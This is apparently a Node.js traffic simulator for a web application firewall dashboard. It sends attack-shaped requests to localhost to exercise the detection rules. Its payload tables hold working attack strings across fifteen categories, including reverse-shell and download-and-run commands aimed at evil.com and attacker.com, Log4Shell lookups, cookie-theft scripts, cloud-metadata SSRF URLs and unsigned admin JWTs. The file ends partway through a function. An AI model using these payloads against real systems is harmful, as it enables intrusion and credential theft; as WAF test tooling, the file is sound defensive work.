/**
 * Traffic Simulator v3 — Middleware-Aware, Incident-Generating
 *
 * How it works:
 *   Every attacker session fires REAL HTTP requests to localhost so they
 *   pass through wafMiddleware. The middleware:
 *     • runs Snort pattern matching on the actual payload/URL/body
 *     • reads the *live* per-rule threshold from the DB (whatever the user
 *       set on the Rules page)
 *     • applies the sensitivity multiplier from System Settings
 *     • writes the alert row to waf_alerts itself
 *     • blocks the IP once the threshold is exceeded
 *
 *   The simulator therefore never decides action/severity itself — the WAF
 *   does. Incidents are produced by the existing incidentEngine (runs every
 *   60 s) once ≥ 5 alerts of the same attack type accumulate.
 *
 * Safety:
 *   • All requests go to 127.0.0.1 — nothing leaves the machine.
 *   • Each attacker IP is spoofed via the X-Forwarded-For header so the WAF
 *     tracks it as a distinct external IP, not the server's own loopback.
 *   • Normal-user sessions send clean requests that will not match any rule.
 *   • A global circuit-breaker caps total requests/s so the server is never
 *     flooded.
 *   • Sessions self-expire and are replaced, so the pool stays bounded.
 *
 * Attack categories covered (all 15 WAF rules):
 *   SQLi, XSS, Brute Force, Path Traversal, RCE, DDoS,
 *   CSRF, XXE, SSRF, Open Redirect, NoSQLi,
 *   Prototype Pollution, HTTP Smuggling, Auth (JWT), Recon
 */

"use strict";

const http  = require("http");
const { v4: uuidv4 } = require("uuid");

// ─── Configuration ────────────────────────────────────────────────────────────

const SERVER_PORT              = process.env.PORT || 5000;
const SERVER_HOST              = "127.0.0.1";

const MAX_CONCURRENT_ATTACKERS = 8;   // simultaneous attack campaigns (raised for 15 types)
const MAX_CONCURRENT_NORMALS   = 4;   // simultaneous normal-user sessions
const TICK_INTERVAL_MS         = 750; // main loop tick rate
const MAX_REQUESTS_PER_TICK    = 8;   // circuit-breaker: max HTTP fires per tick

// ─── Attack profiles ──────────────────────────────────────────────────────────
//
// Each profile describes what HTTP request to send so the WAF's Snort rules
// and pattern matchers detect the correct attack type.  The WAF decides the
// action and threshold — we just need to craft a convincing request.
//
// Snort rule trigger mapping per category:
//   SQLi             → pcre on UNION SELECT / OR tautology / DROP TABLE etc.
//   XSS              → pcre on <script>, onerror=, javascript:, <svg onload=
//   Brute Force      → repeated POST /api/login (WAF checkBruteForce counter)
//   Path Traversal   → pcre on ../../etc/passwd, php://filter, /proc/self
//   RCE              → pcre on `cmd`, $(whoami), system(), SSTI {{ }}, JNDI
//   DDoS             → WAF rate-limit counter exceeded (rapid same-IP requests)
//   CSRF             → headerCheck:"csrf" — POST with mismatched Origin header
//   XXE              → pcre on <!DOCTYPE[...]<!ENTITY in POST body field
//   SSRF             → pcre on url=http://169.254.169.254 or gopher://
//   Open Redirect    → pcre on redirect=https://evil.com or redirect=javascript:
//   NoSQLi           → pcre on {"$ne":...} or {"$where":"function..."} in body
//   Prototype Poll.  → pcre on __proto__[ in URL (raw path, not URL-encoded)
//   HTTP Smuggling   → headerCheck:"smuggling" — Transfer-Encoding + Content-Length
//   Auth (JWT)       → jwtCheck + pcre on eyJ...eyJ... with alg:none header
//   Recon            → userAgentPattern (Nikto/DirBuster/Burp) + urlPattern (.env/.git)

const ATTACK_PROFILES = {

  // ── 1. SQL Injection ────────────────────────────────────────────────────────
  SQLi: {
    minInterval:  900,
    maxInterval:  3_500,
    minRequests:  12,
    maxRequests:  30,
    requests: [
      { method: "GET",  path: "/api/search",      queryPayload: "q",       payload: "' OR '1'='1' --" },
      { method: "POST", path: "/api/login",        bodyKey: "username",     payload: "admin'--" },
      { method: "GET",  path: "/api/users",        queryPayload: "id",      payload: "1 UNION SELECT username,password FROM users--" },
      { method: "POST", path: "/api/data/export",  bodyKey: "filter",       payload: "'; DROP TABLE users; --" },
      { method: "GET",  path: "/api/search",       queryPayload: "q",       payload: "1; EXEC xp_cmdshell('whoami')--" },
      { method: "POST", path: "/api/login",        bodyKey: "password",     payload: "' AND SLEEP(5)--" },
    ],
    userAgents: [
      "sqlmap/1.7.8#stable (https://sqlmap.org)",
      "python-requests/2.28.2",
    ],
  },

  // ── 2. Cross-Site Scripting ─────────────────────────────────────────────────
  XSS: {
    minInterval:  1_500,
    maxInterval:  5_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      { method: "POST", path: "/api/comments",  bodyKey: "content", payload: "<script>alert(document.cookie)</script>" },
      { method: "POST", path: "/api/feedback",  bodyKey: "message", payload: "<img src=x onerror=alert(1)>" },
      { method: "GET",  path: "/search",        queryPayload: "q",  payload: "<svg onload=alert(1)>" },
      { method: "POST", path: "/profile",       bodyKey: "bio",     payload: "<body onload=alert('XSS')>" },
      { method: "GET",  path: "/api/users",     queryPayload: "name", payload: "';alert(String.fromCharCode(88,83,83))//" },
      { method: "POST", path: "/api/users",     bodyKey: "comment", payload: "<iframe src=\"javascript:alert('xss')\">" },
    ],
    userAgents: [
      "Nikto/2.1.6",
      "python-requests/2.28.2",
    ],
  },

  // ── 3. Brute Force ──────────────────────────────────────────────────────────
  "Brute Force": {
    minInterval:  400,
    maxInterval:  1_200,
    minRequests:  25,   // guaranteed to exceed any reasonable BF threshold
    maxRequests:  60,
    requests: [
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "admin", extraBody: { password: "wrongpassword123" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "root",  extraBody: { password: "password" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "user",  extraBody: { password: "123456" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "admin", extraBody: { password: "admin" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "test",  extraBody: { password: "test123" } },
    ],
    userAgents: [
      "Hydra v9.5 (www.thc.org/thc-hydra)",
      "python-requests/2.28.2",
      "curl/7.88.1",
    ],
  },

  // ── 4. Path Traversal / LFI ─────────────────────────────────────────────────
  "Path Traversal": {
    minInterval:  1_000,
    maxInterval:  4_000,
    minRequests:  10,
    maxRequests:  24,
    requests: [
      { method: "GET", path: "/api/files",  queryPayload: "name", payload: "../../etc/passwd" },
      { method: "GET", path: "/download",   queryPayload: "file", payload: "../../../etc/shadow" },
      { method: "GET", path: "/api/read",   queryPayload: "path", payload: "..%2F..%2F..%2Fetc%2Fpasswd" },
      { method: "GET", path: "/api/assets", queryPayload: "src",  payload: "/proc/self/environ" },
      { method: "GET", path: "/static",     queryPayload: "f",    payload: "....//....//etc/passwd" },
      { method: "GET", path: "/api/files",  queryPayload: "name", payload: "%2e%2e%2f%2e%2e%2fetc%2fpasswd" },
    ],
    userAgents: [
      "Nikto/2.1.6",
      "zgrab/0.x",
      "Go-http-client/1.1",
    ],
  },

  // ── 5. Remote Code Execution ────────────────────────────────────────────────
  RCE: {
    minInterval:  2_500,
    maxInterval:  8_000,
    minRequests:  8,
    maxRequests:  16,
    requests: [
      { method: "POST", path: "/api/exec",    bodyKey: "cmd",      payload: "`whoami`" },
      { method: "POST", path: "/api/eval",    bodyKey: "code",     payload: "$(cat /etc/passwd)" },
      { method: "POST", path: "/api/run",     bodyKey: "script",   payload: "system('ls -la')" },
      { method: "POST", path: "/api/process", bodyKey: "input",    payload: "; curl http://evil.com/shell.sh | bash" },
      { method: "POST", path: "/api/exec",    bodyKey: "cmd",      payload: "| nc -e /bin/sh attacker.com 4444" },
      // Log4Shell JNDI injection (pcre + header surface)
      {
        method: "GET",  path: "/api/search",  queryPayload: "q",   payload: "${jndi:ldap://evil.com/exploit}",
        extraHeaders: { "X-Api-Version": "${jndi:ldap://evil.com/exploit}" },
      },
      // Server-Side Template Injection
      { method: "GET",  path: "/api/render",  queryPayload: "template", payload: "{{7*7}}" },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
      "Go-http-client/1.1",
    ],
  },

  // ── 6. DDoS ─────────────────────────────────────────────────────────────────
  // Triggered by rate limiting — fire fast from same spoofed IP to exceed rateLimitRpm.
  DDoS: {
    minInterval:  100,
    maxInterval:  300,
    minRequests:  200,
    maxRequests:  400,
    requests: [
      { method: "GET",  path: "/api/search",  queryPayload: "q",     payload: "test" },
      { method: "GET",  path: "/",            queryPayload: null,    payload: null },
      { method: "POST", path: "/api/v1/auth", bodyKey: "token",      payload: "ping" },
      { method: "GET",  path: "/api/data",    queryPayload: null,    payload: null },
      { method: "GET",  path: "/graphql",     queryPayload: "query", payload: "{__typename}" },
    ],
    userAgents: [
      "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
      "Go-http-client/1.1",
      "python-requests/2.28.2",
    ],
  },

  // ── 7. CSRF ─────────────────────────────────────────────────────────────────
  // Snort trigger: headerCheck "csrf"
  //   Condition: req.method !== GET/HEAD  AND  Origin header is present
  //              AND  origin does NOT include the Host header value.
  // The server Host header from Node's http module is "127.0.0.1:5000",
  // so any external origin string (https://evil-site.com) fires the rule.
  CSRF: {
    minInterval:  2_000,
    maxInterval:  6_000,
    minRequests:  10,
    maxRequests:  24,
    requests: [
      {
        method: "POST", path: "/api/users",
        bodyKey: "action", payload: "delete_account",
        extraHeaders: { "Origin": "https://evil-site.com" },
      },
      {
        method: "POST", path: "/api/settings",
        bodyKey: "email", payload: "attacker@evil.com",
        extraHeaders: { "Origin": "https://malicious-domain.net" },
      },
      {
        method: "POST", path: "/api/users/profile",
        bodyKey: "role", payload: "admin",
        extraHeaders: { "Origin": "https://phishing-page.io" },
      },
      {
        method: "POST", path: "/api/audit-logs",
        bodyKey: "action", payload: "purge",
        extraHeaders: { "Origin": "https://csrf-attacker.ru" },
      },
    ],
    userAgents: [
      // CSRF is forged via a victim's real browser
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
    ],
  },

  // ── 8. XML External Entity (XXE) ────────────────────────────────────────────
  // Snort trigger: pcre on  <!DOCTYPE[...]<!ENTITY  in the request body.
  // Payloads are passed as JSON string field values — snortRules.buildTarget()
  // calls JSON.stringify(req.body), so the DOCTYPE/ENTITY text is visible in
  // the inspection string even though the outer transport is JSON.
  XXE: {
    minInterval:  2_000,
    maxInterval:  7_000,
    minRequests:  8,
    maxRequests:  18,
    requests: [
      {
        method: "POST", path: "/api/xml",
        bodyKey: "data",
        payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      },
      {
        method: "POST", path: "/api/parse",
        bodyKey: "xml",
        payload: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><data>&xxe;</data>",
      },
      {
        method: "POST", path: "/api/upload",
        bodyKey: "content",
        payload: "<!DOCTYPE test [<!ENTITY % ext SYSTEM \"http://evil.com/evil.dtd\">%ext;]>",
      },
      {
        method: "POST", path: "/api/import",
        bodyKey: "document",
        payload: "<!DOCTYPE lolz [<!ENTITY % pe SYSTEM \"https://evil.com/xxe.dtd\"> %pe; %param1;]>",
      },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
    ],
  },

  // ── 9. Server-Side Request Forgery (SSRF) ────────────────────────────────────
  // Snort trigger: pcre on url=/proxy=/fetch= pointing to internal IPs/metadata
  // services, or non-HTTP schemes (gopher://, file://, dict://) in URL params.
  SSRF: {
    minInterval:  1_500,
    maxInterval:  5_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      // AWS IMDS metadata endpoint
      { method: "GET", path: "/api/fetch", queryPayload: "url",      payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
      // GCP metadata endpoint
      { method: "GET", path: "/api/proxy", queryPayload: "target",   payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" },
      // Localhost internal service probe
      { method: "GET", path: "/api/load",  queryPayload: "resource", payload: "http://localhost:8080/actuator/env" },
      // Gopher protocol for Redis RCE via SSRF
      { method: "GET", path: "/api/fetch", queryPayload: "url",      payload: "gopher://localhost:6379/_SET%20ssrf%20pwned" },
      // Internal IP range
      { method: "GET", path: "/api/proxy", queryPayload: "dest",     payload: "http://192.168.1.1/admin" },
      // Azure IMDS
      { method: "GET", path: "/api/load",  queryPayload: "endpoint", payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01" },
      // file:// scheme via non-HTTP resource param
      { method: "GET", path: "/api/fetch", queryPayload: "src",      payload: "file:///etc/passwd" },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
      "Go-http-client/1.1",
    ],
  },

  // ── 10. Open Redirect ───────────────────────────────────────────────────────
  // Snort trigger (SID 1000070): pcre on redirect=/next=/to= pointing to
  //   external domains — //evil.com or https://evil.com
  // Snort trigger (SID 1000071): pcre on redirect=javascript: or redirect=data:
  "Open Redirect": {
    minInterval:  1_500,
    maxInterval:  5_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      // External-domain redirect (SID 1000070)
      { method: "GET", path: "/logout",        queryPayload: "redirect",  payload: "https://evil-phishing.com/fake-login" },
      { method: "GET", path: "/api/callback",  queryPayload: "returnUrl", payload: "https://attacker.net/steal-token" },
      { method: "GET", path: "/login",         queryPayload: "next",      payload: "//evil.com/credential-harvest" },
      { method: "GET", path: "/api/auth",      queryPayload: "goto",      payload: "https://malicious-site.ru" },
      { method: "GET", path: "/redirect",      queryPayload: "url",       payload: "https://phishing.io/impersonate" },
      // javascript: / data: scheme in redirect target (SID 1000071)
      { method: "GET", path: "/logout",        queryPayload: "dest",      payload: "javascript:alert(document.cookie)" },
      { method: "GET", path: "/api/callback",  queryPayload: "to",        payload: "data:text/html,<script>fetch('https://evil.com/?c='+document.cookie)</script>" },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    ],
  },

  // ── 11. NoSQL Injection ─────────────────────────────────────────────────────
  // Snort trigger: pcre on {"$ne":...}, {"$where":"function..."} in JSON body.
  // Use extraBody (not bodyKey/payload) so the MongoDB operator objects are
  // embedded directly — JSON.stringify preserves $-prefixed keys correctly.
  NoSQLi: {
    minInterval:  1_200,
    maxInterval:  4_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      // $ne operator — auth bypass: password != null (SID 1000080)
      {
        method: "POST", path: "/api/login",
        extraBody: { username: "admin", password: { "$ne": null } },
      },
      // $gt operator — numeric comparison bypass
      {
        method: "POST", path: "/api/login",
        extraBody: { username: "admin", password: { "$gt": "" } },
      },
      // $regex operator — enumerate users matching a pattern
      {
        method: "POST", path: "/api/users/search",
        extraBody: { username: { "$regex": "admin.*", "$options": "i" } },
      },
      // $where with JS function — server-side JS execution (SID 1000081)
      {
        method: "POST", path: "/api/login",
        extraBody: { username: "admin", password: { "$where": "this.password.length > 0" } },
      },
      // $in operator — enumerate multiple role values
      {
        method: "POST", path: "/api/users/search",
        extraBody: { role: { "$in": ["admin", "superuser", "root"] } },
      },
      // $exists — bypass login where field simply has to exist
      {
        method: "POST", path: "/api/login",
        extraBody: { username: { "$nin": ["blocked_user"] }, password: { "$exists": true } },
      },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
    ],
  },

  // ── 12. Prototype Pollution ─────────────────────────────────────────────────
  // Snort trigger: pcre on __proto__[ or constructor[ or constructor.prototype
  //   Pattern: /(?:["']?__proto__["']?|constructor\s*\[|...)\s*[=:[{]/
  //
  // IMPORTANT — JSON.stringify() silently drops __proto__ set via object-literal
  // syntax, so bodyKey/payload approach would not work. Instead the attack string
  // is embedded directly in the raw URL path (no queryPayload encoding), which
  // means req.originalUrl contains __proto__[ verbatim for snortRules to match.
  "Prototype Pollution": {
    minInterval:  1_500,
    maxInterval:  5_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      // __proto__[key]=value in query string — unencoded, goes straight to originalUrl
      { method: "GET",  path: "/api/merge?__proto__[isAdmin]=true",               queryPayload: null, payload: null },
      { method: "GET",  path: "/api/settings?__proto__[role]=admin",              queryPayload: null, payload: null },
      { method: "GET",  path: "/api/config?constructor[prototype][isAdmin]=true", queryPayload: null, payload: null },
      { method: "GET",  path: "/api/users?filter[__proto__][admin]=1",            queryPayload: null, payload: null },
      { method: "GET",  path: "/api/data?obj[constructor][prototype][evil]=pwned",queryPayload: null, payload: null },
      // POST with constructor.prototype in raw JSON string field value
      {
        method: "POST", path: "/api/merge",
        bodyKey: "patch",
        payload: "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
      },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "Go-http-client/1.1",
    ],
  },

  // ── 13. HTTP Request Smuggling ──────────────────────────────────────────────
  // Snort trigger: headerCheck "smuggling"
  //   Condition: (Transfer-Encoding header AND Content-Length header both present)
  //              OR Transfer-Encoding has an obfuscated value.
  // POST body ensures Content-Length is always set by fireRequest.
  // Transfer-Encoding is injected via extraHeaders to create the conflicting pair.
  // Obfuscated variants ("chunked ", "chunked,identity", "\tchunked", "chunked0")
  // match the regex: /chunked[\s\t,;]|[\s\t]chunked|chunked0/i
  "HTTP Smuggling": {
    minInterval:  3_000,
    maxInterval:  9_000,
    minRequests:  8,
    maxRequests:  18,
    requests: [
      // CL.TE desync — both Transfer-Encoding and Content-Length present
      {
        method: "POST", path: "/api/users",
        bodyKey: "data",
        payload: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        extraHeaders: { "Transfer-Encoding": "chunked" },
      },
      // TE.CL desync — trailing space after "chunked" (obfuscated)
      {
        method: "POST", path: "/api/search",
        bodyKey: "query", payload: "legit-looking search query",
        extraHeaders: { "Transfer-Encoding": "chunked " },
      },
      // chunked,identity — comma variant matches /chunked[\s\t,;]/
      {
        method: "POST", path: "/api/process",
        bodyKey: "input", payload: "normal-input",
        extraHeaders: { "Transfer-Encoding": "chunked,identity" },
      },
      // Tab before chunked — matches /[\s\t]chunked/
      {
        method: "POST", path: "/api/data",
        bodyKey: "payload", payload: "test-data",
        extraHeaders: { "Transfer-Encoding": "\tchunked" },
      },
      // "chunked0" — matches /chunked0/
      {
        method: "POST", path: "/api/upload",
        bodyKey: "content", payload: "smuggled-content",
        extraHeaders: { "Transfer-Encoding": "chunked0" },
      },
    ],
    userAgents: [
      // Smuggling is done with raw HTTP tools, not browsers
      "python-requests/2.28.2",
      "Go-http-client/1.1",
      "curl/7.88.1",
    ],
  },

  // ── 14. Auth — JWT Algorithm Confusion ──────────────────────────────────────
  // Snort trigger: jwtCheck (reads Authorization header, decodes JWT header
  //   segment and checks if alg === "none")  AND  pcre on eyJ...eyJ... format.
  //
  // All tokens below are real base64url-encoded JWTs with "alg":"none":
  //   Header segment (same for all):
  //     {"alg":"none","typ":"JWT"}  →  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  //   Payload segments vary (admin:true, role:superadmin, elevated permissions).
  //   Signature part is intentionally empty (alg:none requires no signature).
  Auth: {
    minInterval:  2_000,
    maxInterval:  6_000,
    minRequests:  10,
    maxRequests:  20,
    requests: [
      // Payload: {"sub":"1234567890","admin":true,"iat":1516239022}
      {
        method: "GET", path: "/api/users",
        queryPayload: null, payload: null,
        extraHeaders: {
          "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.",
        },
      },
      // Payload: {"sub":"999","role":"superadmin","iat":1690000000}
      {
        method: "GET", path: "/api/data/export",
        queryPayload: null, payload: null,
        extraHeaders: {
          "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI5OTkiLCJyb2xlIjoic3VwZXJhZG1pbiIsImlhdCI6MTY5MDAwMDAwMH0.",
        },
      },
      // Payload: {"userId":"42","permissions":["read","write","admin"],"iat":1690000000}
      {
        method: "POST", path: "/api/users/profile",
        bodyKey: "role", payload: "admin",
        extraHeaders: {
          "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiI0MiIsInBlcm1pc3Npb25zIjpbInJlYWQiLCJ3cml0ZSIsImFkbWluIl0sImlhdCI6MTY5MDAwMDAwMH0.",
        },
      },
      // Payload: {"sub":"1","name":"attacker","admin":true}
      {
        method: "GET", path: "/api/settings",
        queryPayload: null, payload: null,
        extraHeaders: {
          "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwibmFtZSI6ImF0dGFja2VyIiwiYWRtaW4iOnRydWV9.",
        },
      },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
    ],
  },

  // ── 15. Reconnaissance ─────────────────────────────────────────────────────
  // Snort triggers:
  //   userAgentPattern → Nikto, masscan, DirBuster, gobuster, ffuf, Burp, ZAP
  //                      (each matches a different SID: 1000041, 1000042, 1000120, 1000121)
  //   urlPattern       → /.env, /.git/config, /backup.sql, /wp-config.php, etc.
  //                      (SID 1000043)
  // Real recon campaigns combine scanner user-agents WITH sensitive path probing.
  Recon: {
    minInterval:  600,
    maxInterval:  2_500,
    minRequests:  20,
    maxRequests:  50,
    requests: [
      // Sensitive file discovery — urlPattern trigger (SID 1000043)
      { method: "GET", path: "/.env",                queryPayload: null, payload: null },
      { method: "GET", path: "/.env.production",     queryPayload: null, payload: null },
      { method: "GET", path: "/.git/config",         queryPayload: null, payload: null },
      { method: "GET", path: "/.git/HEAD",           queryPayload: null, payload: null },
      { method: "GET", path: "/backup.sql",          queryPayload: null, payload: null },
      { method: "GET", path: "/database.yml",        queryPayload: null, payload: null },
      { method: "GET", path: "/wp-config.php",       queryPayload: null, payload: null },
      { method: "GET", path: "/.htpasswd",           queryPayload: null, payload: null },
      { method: "GET", path: "/credentials.json",    queryPayload: null, payload: null },
      { method: "GET", path: "/docker-compose.yml",  queryPayload: null, payload: null },
      { method: "GET", path: "/id_rsa",              queryPayload: null, payload: null },
      { method: "GET", path: "/secrets.yaml",        queryPayload: null, payload: null },
      // Path enumeration — common scanner probes
      { method: "GET", path: "/api/v1/users",        queryPayload: null, payload: null },
      { method: "GET", path: "/api/v2/admin",        queryPayload: null, payload: null },
      { method: "GET", path: "/phpmyadmin",          queryPayload: null, payload: null },
      { method: "GET", path: "/api/swagger.json",    queryPayload: null, payload: null },
      { method: "GET", path: "/actuator/env",        queryPayload: null, payload: null },
    ],
    userAgents: [
      // Each of these matches a distinct userAgentPattern rule in snortRules.js
      "Nikto/2.1.6",                                               // SID 1000041
      "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", // SID 1000042
      "DirBuster-1.0-RC1",                                         // SID 1000121
      "gobuster/3.6",                                              // SID 1000121
      "ffuf/2.1.0",                                                // SID 1000121
      "wfuzz/3.1.0",                                               // SID 1000121
      "Mozilla/5.0 (compatible; Burp Suite Professional/2023.10)", // SID 1000120
      "w3af.org",                                                  // SID 1000120
      "Acunetix/14.0",                                             // SID 1000120
      "OpenVAS/21.04",                                             // SID 1000120
    ],
  },

};

// ─── Normal traffic profile ───────────────────────────────────────────────────

const NORMAL_REQUESTS = [
  { method: "GET",  path: "/api/alerts" },
  { method: "GET",  path: "/api/rules" },
  { method: "GET",  path: "/api/dashboard" },
  { method: "GET",  path: "/api/incidents" },
  { method: "GET",  path: "/health" },
  { method: "GET",  path: "/api/analytics" },
];

const NORMAL_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIP() {
  // Generate a public-looking IP so WAF geoip + tracker works correctly
  const blocked = [10, 127, 172, 192, 169, 100, 198, 203];
  let a;
  do { a = randInt(1, 223); } while (blocked.includes(a));
  return `${a}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

/**
 * Fire one HTTP request to the local WAF server.
 *
 * The X-Forwarded-For header makes the WAF treat `spoofedIP` as the source.
 * The WAF's getRealIP() reads X-Forwarded-For first, so threshold tracking
 * and blocklisting are all keyed to this spoofed IP — exactly what we want.
 *
 * `extraHeaders` (optional) — merged into the headers object so per-profile
 * additions like Origin (CSRF), Authorization (Auth/JWT), or Transfer-Encoding
 * (HTTP Smuggling) are included in every request of that profile.
 */
function fireRequest({ method, path, queryPayload, bodyKey, payload, extraBody, spoofedIP, userAgent, extraHeaders }) {
  return new Promise((resolve) => {
    let fullPath = path;

    // Attach payload to query string for GET requests
    if (method === "GET" && queryPayload && payload) {
      fullPath = `${path}?${queryPayload}=${encodeURIComponent(payload)}`;
    }

    // Build JSON body for POST requests
    let bodyStr = null;
    if (method === "POST") {
      const bodyObj = { ...(extraBody || {}) };
      if (bodyKey && payload) bodyObj[bodyKey] = payload;
      bodyStr = JSON.stringify(bodyObj);
    }

    const options = {
      hostname: SERVER_HOST,
      port:     SERVER_PORT,
      path:     fullPath,
      method,
      headers: {
        "X-Forwarded-For": spoofedIP,
        "User-Agent":      userAgent,
        "Accept":          "application/json",
        // extraHeaders merged before Content-Type/Length so body metadata wins
        ...(extraHeaders || {}),
        ...(bodyStr ? {
          "Content-Type":   "application/json",
          "Content-Length": Buffer.byteLength(bodyStr),
        } : {}),
      },
    };

    const req = http.request(options, (res) => {
      // Drain the response body so the socket is released
      res.resume();
      res.on("end", () => resolve({ status: res.statusCode }));
    });

    req.on("error", () => resolve({ status: 0 })); // swallow network errors
    req.setTimeout(4_000, () => { req.destroy(); resolve({ status: 0 }); });

    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

// ─── AttackerSession ──────────────────────────────────────────────────────────

class AttackerSession {
  constructor(attackType) {
    const profile      = ATTACK_PROFILES[attackType];
    this.id            = uuidv4();
    this.attackType    = attackType;
    this.profile       = profile;
    this.ip            = randomIP();   // spoofed source IP
    this.userAgent     = pick(profile.userAgents);
    this.maxRequests   = randInt(profile.minRequests, profile.maxRequests);
    this.requestsMade  = 0;
    this.interval      = randInt(profile.minInterval, profile.maxInterval);
    this.nextFireAt    = Date.now() + randInt(0, 2_000); // stagger startup
  }

  get isExpired() { return this.requestsMade >= this.maxRequests; }
  get shouldFire() { return !this.isExpired && Date.now() >= this.nextFireAt; }

  async fire() {
    this.requestsMade++;
    // Schedule next fire BEFORE the await so timing is independent of latency
    this.nextFireAt = Date.now() + randInt(this.profile.minInterval, this.profile.maxInterval);

    const template = pick(this.profile.requests);
    const result   = await fireRequest({
      ...template,          // spreads method, path, queryPayload, bodyKey,
                            // payload, extraBody, extraHeaders from the template
      spoofedIP:  this.ip,
      userAgent:  this.userAgent,
    });

    return result;
  }
}

// ─── NormalUserSession ────────────────────────────────────────────────────────

class NormalUserSession {
  constructor() {
    this.id           = uuidv4();
    this.ip           = randomIP();
    this.userAgent    = pick(NORMAL_AGENTS);
    this.maxRequests  = randInt(5, 20);
    this.requestsMade = 0;
    this.nextFireAt   = Date.now() + randInt(0, 4_000);
  }

  get isExpired() { return this.requestsMade >= this.maxRequests; }
  get shouldFire() { return !this.isExpired && Date.now() >= this.nextFireAt; }

  async fire() {
    this.requestsMade++;
    this.nextFireAt = Date.now() + randInt(3_000, 12_000);

    const template = pick(NORMAL_REQUESTS);
    await fireRequest({
      method:       template.method,
      path:         template.path,
      queryPayload: null,
      payload:      null,
      bodyKey:      null,
      extraBody:    null,
      extraHeaders: null,
      spoofedIP:    this.ip,
      userAgent:    this.userAgent,
    });
  }
}

// ─── Session pool ─────────────────────────────────────────────────────────────

const attackers = new Set();
const normals   = new Set();
const ATTACK_TYPES = Object.keys(ATTACK_PROFILES);

function spawnAttacker() {
  const type    = pick(ATTACK_TYPES);
  const session = new AttackerSession(type);
  attackers.add(session);
  console.log(
    `🎯  [Simulator] New ${type} campaign  ip=${session.ip}  ` +
    `budget=${session.maxRequests} req  interval=${session.interval}ms`
  );
}

function spawnNormal() {
  normals.add(new NormalUserSession());
}

// ─── Main tick ────────────────────────────────────────────────────────────────

async function tick() {
  // Expire finished sessions
  for (const s of attackers) {
    if (s.isExpired) {
      attackers.delete(s);
      console.log(`✅  [Simulator] ${s.attackType} campaign ended  ip=${s.ip}  requests=${s.requestsMade}`);
    }
  }
  for (const s of normals) {
    if (s.isExpired) normals.delete(s);
  }

  // Top up pool
  while (attackers.size < MAX_CONCURRENT_ATTACKERS) spawnAttacker();
  while (normals.size  < MAX_CONCURRENT_NORMALS)   spawnNormal();

  // Collect sessions ready to fire this tick
  const readyAttackers = [...attackers].filter(s => s.shouldFire);
  const readyNormals   = [...normals].filter(s => s.shouldFire);
  const allReady       = [...readyAttackers, ...readyNormals];

  // Circuit-breaker: cap fires per tick to avoid flooding
  const toFire = allReady.slice(0, MAX_REQUESTS_PER_TICK);

  await Promise.allSettled(toFire.map(s => s.fire().catch(() => {})));
}

// ─── Public API ───────────────────────────────────────────────────────────────

let simulatorInterval = null;

function startSimulator() {
  if (simulatorInterval) return;

  console.log("🔄  Traffic Simulator v3 started (middleware-aware, all 15 categories)");
  console.log(`    └─ Requests go to http://${SERVER_HOST}:${SERVER_PORT}`);
  console.log(`    └─ X-Forwarded-For spoofing per session`);
  console.log(`    └─ WAF handles detection, thresholds, and DB writes`);
  console.log(`    └─ ${MAX_CONCURRENT_ATTACKERS} attack sessions  +  ${MAX_CONCURRENT_NORMALS} normal sessions`);
  console.log(`    └─ Attack types: ${ATTACK_TYPES.join(", ")}`);

  // Seed sessions immediately
